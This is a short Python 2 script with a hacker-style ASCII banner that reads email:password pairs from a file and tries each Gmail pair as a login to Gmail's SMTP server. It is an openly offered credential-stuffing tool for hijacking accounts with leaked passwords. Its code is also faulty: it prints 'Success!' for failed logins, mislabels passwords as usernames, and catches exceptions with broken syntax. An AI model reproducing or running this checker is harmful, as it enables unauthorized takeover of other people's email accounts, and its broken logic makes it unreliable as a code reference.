#!/usr/bin/python
'''create by Rishihacktool'''
import smtplib
from os import system

def main():
   print '================================================='
   print '                        RiShi                    '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print '           Rishi                                '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()   V.1.0        '

main()
f = open('list.txt','r')
emails = f.read().split('\n')
info = [i.split(':') for i in emails if (i.find('@gmail.com')>0)]
f.close()

#print '\n'.join(map(str, info))
#exit(0)


for i in  info:
	s = smtplib.SMTP('smtp.gmail.com:587')
	s.ehlo()
	s.starttls()
	s.ehlo()
	try:
		ans = s.login(i[0], i[1])
		print 'Success: '+i[0]
		print 'Username: '+i[1]
		exit(0)
	except smtplib.SMTPAuthenticationError, smtplib.SMTPServerDisconnected:
		log = '###########iD '+i[0]+' with password '+i[1].split('\r')[0]+' Success!'
		print(log)
